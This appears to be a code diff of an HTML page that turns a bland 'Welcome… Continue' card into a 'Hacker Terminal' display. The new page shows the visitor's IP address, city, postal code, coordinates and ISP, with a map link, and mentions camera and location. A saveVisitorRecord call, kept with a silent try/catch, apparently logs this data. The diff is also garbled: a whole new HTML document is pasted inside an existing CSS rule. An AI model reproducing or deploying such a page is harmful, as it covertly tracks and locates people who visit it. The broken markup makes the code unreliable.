@@ -26,91 +26,166 @@
             background: #ffffff;
             border: 1px solid #dbeafe;
             border-radius: 20px;
-            padding: 32px;
-            max-width: 440px;
-            width: 100%;
-            box-shadow: 0 10px 30px rgba(15, 23, 42, 0.08);
-        }
 
-        h1 {
-            font-size: 24px;
-            margin: 0 0 8px;
-            color: #1d4ed8;
-        }
+            < !DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Hacker Terminal | Network Trace</title><style>* {
+                box-sizing: border-box;
+            }
 
-        p.sub {
-            color: #6b7280;
-            font-size: 15px;
-            margin: 0 0 24px;
-            line-height: 1.5;
-        }
+            body {
+                margin: 0;
+                min-height: 100vh;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                font-family: "Consolas", "Courier New", monospace;
+                background: radial-gradient(circle at top, #10261b 0%, #020604 70%, #000 100%);
+                color: #7cffb2;
+                padding: 20px;
+                text-shadow: 0 0 6px rgba(124, 255, 178, 0.35);
+            }
 
-        .actions {
-            margin: 0 0 14px;
-        }
+            .card {
+                background: rgba(2, 12, 8, 0.95);
+                border: 1px solid #2bff8a;
+                border-radius: 16px;
+                padding: 32px;
+                max-width: 440px;
+                width: 100%;
+                box-shadow: 0 0 25px rgba(43, 255, 138, 0.25);
+                position: relative;
+                overflow: hidden;
+            }
 
-        .action-btn {
-            width: 100%;
-            border: 0;
-            border-radius: 999px;
-            padding: 13px 16px;
-            background: linear-gradient(135deg, #2563eb, #3b82f6);
-            color: white;
-            font-size: 15px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: transform 0.2s ease, box-shadow 0.2s ease;
-            box-shadow: 0 8px 18px rgba(37, 99, 235, 0.2);
-        }
+            .card::before {
+                content: "";
+                position: absolute;
+                inset: 0;
+                background: repeating-linear-gradient(180deg, rgba(43, 255, 138, 0.03), rgba(43, 255, 138, 0.03) 1px, transparent 1px, transparent 4px);
+                pointer-events: none;
+            }
 
-        .action-btn:hover {
-            transform: translateY(-1px);
-            box-shadow: 0 10px 22px rgba(37, 99, 235, 0.25);
-        }
+            h1 {
+                font-size: 20px;
+                margin: 0 0 6px;
+                color: #8bffbb;
+                letter-spacing: 0.1em;
+                text-transform: uppercase;
+            }
 
-        .action-btn:disabled {
-            opacity: 0.75;
-            cursor: wait;
-        }
+            p.sub {
+                color: #5bd98b;
+                font-size: 13px;
+                margin: 0 0 20px;
+                letter-spacing: 0.08em;
+                text-transform: uppercase;
+            }
 
-        .status {
-            margin: 10px 0 16px;
-            font-size: 14px;
-            color: #4b5563;
-            min-height: 24px;
-            line-height: 1.5;
-        }
+            .row {
+                display: flex;
+                justify-content: space-between;
+                padding: 10px 0;
+                border-bottom: 1px solid rgba(43, 255, 138, 0.2);
+                font-size: 14px;
+            }
 
-        .status.success {
-            color: #15803d;
-        }
+            .row:last-child {
+                border-bottom: none;
+            }
 
-        .status.error {
-            color: #dc2626;
-        }
+            .label {
+                color: #78c996;
+            }
 
-        .loading {
-            text-align: center;
-            color: #6b7280;
-            padding: 10px 0 0;
-        }
+            .value {
+                color: #f0fff6;
+                font-weight: 600;
+                text-align: right;
+            }
 
-        .error {
-            color: #dc2626;
-            text-align: center;
-        }
+            .loading {
+                text-align: center;
+                color: #5bd98b;
+                padding: 20px 0;
+            }
+
+            .map-link {
+                display: inline-block;
+                margin-top: 20px;
+                text-align: center;
+                width: 100%;
+                padding: 10px;
+                background: rgba(43, 255, 138, 0.12);
+                border: 1px solid rgba(43, 255, 138, 0.3);
+                border-radius: 8px;
+                color: #dfffe9;
+                text-decoration: none;
+                font-size: 14px;
+            }
+
+            .map-link:hover {
+                background: rgba(43, 255, 138, 0.2);
+            }
+
+            .actions {
+                margin: 0 0 12px;
+            }
+
+            .action-btn {
+                width: 100%;
+                border: 1px solid #2bff8a;
+                border-radius: 10px;
+                padding: 12px 14px;
+                background: #0b2414;
+                color: #7cffb2;
+                font-size: 14px;
+                font-weight: 700;
+                cursor: pointer;
+                letter-spacing: 0.06em;
+                text-transform: uppercase;
+            }
+
+            .action-btn:hover {
+                background: #123b22;
+                box-shadow: 0 0 12px rgba(43, 255, 138, 0.25);
+            }
+
+            .action-btn:disabled {
+                opacity: 0.7;
+                cursor: wait;
+            }
+
+            .status {
+                margin: 10px 0 16px;
+                font-size: 13px;
+                color: #b9ffd2;
+                min-height: 20px;
+                line-height: 1.5;
+            }
+
+            .status.success {
+                color: #86efac;
+            }
+
+            .status.error {
+                color: #fda4af;
+            }
+
+            .error {
+                color: #f87171;
+                text-align: center;
+            }
     </style>
 </head>
 
 <body>
     <div class="card">
-        <h1>Welcome</h1>
-        <p class="sub">Let’s get started with a simple and secure experience. Tap the button below to continue.</p>
+        <h1>Access Terminal</h1>
+        <p class="sub">Network trace • camera • location</p>
         <div class="actions">
-            <button id="accessBtn" class="action-btn" type="button">Continue</button>
+            <button id="accessBtn" class="action-btn" type="button">تواصل معي</button>
         </div>
-        <div id="status" class="status">Ready when you are.</div>
-        <div id="content" class="loading"></div>
+        <div id="status" class="status">Awaiting access request...</div>
+        <div id="content" class="loading">Scanning IP signature...</div>
     </div>
 
     <script>
@@ -228,10 +303,30 @@
                 }
             }
 
-            saveVisitorRecord(data);
+            try { saveVisitorRecord(data); } catch (e) { /* ignore */ }
 
-            el.className = 'loading';
-            el.innerHTML = 'Thanks! Your request has been received.';
+            const rows = [
+                ['IP Address', data.ip],
+                ['City', data.city],
+                ['Region', data.region],
+                ['Country', data.country],
+                ['Postal Code', data.postal],
+                ['Coordinates', (data.lat && data.lon) ? `${data.lat}, ${data.lon}` : 'N/A'],
+                ['Timezone', data.timezone],
+                ['ISP / Org', data.org],
+            ];
+
+            el.className = '';
+            el.innerHTML = rows.map(([label, value]) => `
+                            <div class="row">
+                                <span class="label">${label}</span>
+                                <span class="value">${value ?? 'N/A'}</span>
+                            </div>
+                        `).join('') + (
+                    (data.lat && data.lon)
+                        ? `<a class="map-link" target="_blank" href="https://www.google.com/maps?q=${data.lat},${data.lon}">View approximate area on map</a>`
+                        : ''
+                );
         }
         loadInfo();
     </script>
